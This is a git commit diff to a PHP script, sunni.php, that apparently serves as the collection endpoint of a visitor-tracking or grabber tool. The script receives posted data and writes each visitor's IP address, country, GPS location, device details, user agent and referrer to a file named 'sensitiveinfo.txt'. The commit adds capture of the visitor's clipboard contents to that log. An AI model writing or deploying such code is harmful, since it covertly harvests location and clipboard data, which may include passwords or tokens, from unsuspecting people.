45d5a51e741f1d67e41ee7fc6f5e09b8a33a2fea
swagkarna <46685308+swagkarna@users.noreply.github.com>
2022-03-02 13:44:16 +0530

    Update sunni.php

--- sunni.php
+++ sunni.php
@@ -16,6 +16,7 @@ $useragent = $_POST['useragent'];
 $deviceram = $_POST['deviceram'];
 $cpuThreads = $_POST['cpuThreads'];
 $referurl = $_POST['referurl'];
+$clipboard = $_POST['clipboard'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $ulke = $details->country;
@@ -23,7 +24,7 @@ date_default_timezone_set('Europe/Istanbul');
 $tarih=date("d-m-Y H:i:s");
 $file = fopen('sensitiveinfo.txt', 'a');
 fwrite($file, "Ip Address: " .$ip."\n\n".
-"Country: ".$ulke ."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."ReferUrl: ".$referurl."\n\n\n\n");
+"Country: ".$ulke ."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."Clipboard: ".$clipboard."\n\n"."ReferUrl: ".$referurl."\n\n\n\n");
 fclose($file);
 
 
